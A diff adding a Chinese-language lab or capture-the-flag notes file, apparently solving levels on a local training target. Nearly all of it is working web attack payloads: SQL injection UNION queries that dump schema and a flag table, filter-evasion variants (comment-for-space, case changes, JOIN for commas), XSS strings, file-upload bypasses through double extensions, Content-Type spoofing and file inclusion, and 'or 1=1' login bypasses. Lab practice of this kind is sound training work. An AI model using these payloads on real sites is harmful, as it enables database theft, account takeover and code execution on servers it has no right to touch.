@@ -1,0 +1,79 @@
+猜解SQL查询语句中的字段数
+1'order by 1#
+
+获取数据库名
+1' union select 1,database() #
+>>targetsys
+
+获取数据库中的表
+1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+>>admin,flag,root,user,userid
+
+获取表中的列名
+1' UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name = 'flag'#
+
+1' UNION SELECT 1,group_concat(Id,flag) FROM flag#
+1' UNION SELECT * FROM flag#
+
+Sql2过滤掉空格，将空格用/**/代替,select被过滤，用大写，flag字段被过滤，用*代替
+1'or/**/1=1/**/order/**/by/**/1#
+1'order/**/by/**/1#
+1'/**/union/**/Select/**/1,database()#
+1'/**/union/**/Select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#
+1'/**/UNION/**/SELECT/**/1,GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=database()/**/and/**/table_name='flag'#
+1'/**/UNION/**/SELECT/**/*/**/FROM/**/flag/**/#
+
+Sql3空格过滤，用/**/代替,select被过滤，用大写;逗号过滤，用join拼接。
+1'order/**/by/**/1#
+1'/**/union/**/Select/**/*/**/from/**/((Select/**/1)A/**/join/**/(Select/**/database())B)#
+1'union/**/Select/**/*/**/from/**/((Select/**/1)A/**/join/**/(Select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())B)#
+1'union/**/Select/**/*/**/from/**/((Select/**/1)A/**/join/**/(Select/**/GROUP_CONCAT(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='flag')B)#
+1'/**/UNION/**/SELECT/**/*/**/FROM/**/flag/**/#
+
+Sql4有3个字段，不做其他过滤
+1'order by 1#
+1' union select 1,1,database()#
+1' union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database()#
+1' UNION SELECT 1,1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name = 'flag'#
+1' UNION SELECT 1,1,flag FROM flag#
+
+XSS1弹窗
+http://192.168.48.136/web/xss1.php?name=<script>alert(1)</script>
+
+XSS2转义标签
+admin' onmouseover='alert(1)
+admin' oninput='alert(1)
+admin' onchange='alert(1)
+
+XSS3闭合的XSS漏洞
+它把script 和 on 中加入了下划线。
+那么鼠标事件，就不能用了，可以考虑下用链接（href）,即在链接中调用js
+admin"></input><a href="javascript:onclick=alert(123)">admin</a><input value="admin
+
+XSS4双写绕过的xss漏洞
+"><scrscriptipt>alert()</scrscriptipt>
+
+upload2禁止脚本文件上传
+将脚本dxr.php改为dxr.a.php上传
+
+upload3上传脚本dxr.php
+用burpSuite拦截包，修改数据包
+------WebKitFormBoundaryPxbyAp6Edmfr4rmJ
+Content-Disposition: form-data; name="uploaded"; filename="dxr.php"
+Content-Type: application/octet-stream 
+将Content-Type改为图片格式image/jpeg，再转发
+
+upload4文件上传包含文件
+先上传dxr.png脚本
+http://192.168.48.136/web/inclusion.php?page=Upload4/dxr.png引入脚本
+
+登录1
+username=随意
+password=1'/**/or/**/1=1# 
+
+username='OR 1 = 1#
+password=随意
+
+
+
+
